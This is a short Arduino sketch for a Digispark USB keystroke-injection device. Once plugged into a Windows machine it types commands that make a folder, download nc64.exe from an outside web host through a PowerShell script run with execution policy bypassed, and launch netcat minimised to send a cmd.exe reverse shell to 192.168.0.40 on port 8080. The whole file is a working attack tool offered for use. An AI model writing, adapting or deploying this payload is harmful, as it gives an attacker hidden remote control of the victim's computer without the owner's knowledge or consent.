#include "DigiKeyboard.h"
//script created by leonardolarosa lrosa@acaditi.com.br
void setup()
{//Desliga o LED enquanto o código está sendo executado e liga quando finaliza o script. Dessa forma você saberá quando desconectar o dispositivo.
  pinMode(1, OUTPUT);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd / & mkdir win & cd /win & echo (wget 'https://l2r1.com.br/nc64.exe' -OutFile a.exe) > b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.println("START /MIN a.exe 192.168.0.40 8080 -e cmd.exe -d & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
